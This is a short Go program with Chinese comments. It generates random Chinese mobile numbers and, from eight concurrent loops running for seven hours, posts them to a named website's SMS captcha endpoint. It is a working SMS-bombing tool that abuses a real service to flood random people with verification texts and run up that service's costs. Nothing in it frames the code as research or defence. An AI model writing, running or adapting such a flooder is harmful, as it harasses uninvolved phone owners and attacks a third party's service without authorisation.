package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

type RequestInfo struct {
	Url  string
	Data map[string]string //post要传输的数据，必须key value必须都是string
}

func postUrlEncoded(i *RequestInfo) ([]byte, error) {
	client := &http.Client{}
	//post要提交的数据
	DataUrlVal := url.Values{}
	for key, val := range i.Data {
		DataUrlVal.Add(key, val)
	}
	req, err := http.NewRequest("POST", i.Url, strings.NewReader(DataUrlVal.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	//提交请求
	resp, err := client.Do(req)
	defer resp.Body.Close()
	if err != nil {
		return nil, err
	}
	//读取返回值
	result, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func genPhone() (p string) {
	hr := []string{"155", "182", "133", "156", "188", "189", "187", "135"}
	rand.Seed(time.Now().UnixNano())
	rh := hr[rand.Intn(len(hr))]
	rt := rand.Intn(80000000) + 10000000
	return rh + strconv.Itoa(rt)
}

func runner(count *int) {
	r := new(RequestInfo)
	p := genPhone()
	r.Url = "https://h5.firstpi.cn/index.php?s=/api/smscaptcha/send"
	m := make(map[string]string)
	m["type"] = "2"
	m["phone"] = p
	m["wxapp_id"] = "10001"
	m["token"] = ""
	m["is_h5"] = "1"
	r.Data = m
	encoded, err := postUrlEncoded(r)
	if err != nil {
		panic(err)
	}
	*count++
	fmt.Println("-----phone-----: " + p)
	fmt.Printf("%s\n", encoded)
	fmt.Println("------ count is: " + strconv.Itoa(*count))
}

func main() {
	var count int
	for i := 0; i < 8; i++ {
		go func(count *int) {
			for {
				runner(count)
			}
		}(&count)
	}
	time.Sleep(7 * time.Hour)
}
